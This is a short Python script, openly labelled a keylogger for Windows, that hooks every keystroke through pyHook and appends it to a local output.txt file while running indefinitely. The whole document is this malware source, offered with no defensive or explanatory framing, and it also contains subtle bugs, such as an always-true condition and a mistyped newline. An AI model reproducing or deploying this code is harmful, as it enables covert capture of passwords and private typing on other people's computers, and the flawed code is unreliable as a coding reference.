
# Python code for keylogger 
# to be used in windows 
import win32console 
import pythoncom, pyHook 
import os, sys
win = win32console.GetConsoleWindow()
def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        sys.exit(1)
    if event.Ascii !=0 or 8: 
    #open output.txt to read current keystrokes 
        f = open(os.getcwd()+'\output.txt', 'r+') 
        buffer = f.read()
        f.truncate()
        f.close() 
    # open output.txt to write current + new keystrokes 
        f = open(os.getcwd()+'\output.txt', 'w') 
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: 
            keylogs = '/n'
        buffer += keylogs 
        f.write(buffer) 
        f.close()
    return 1
# create a hook manager object 
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
# set the hook 
hm.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages()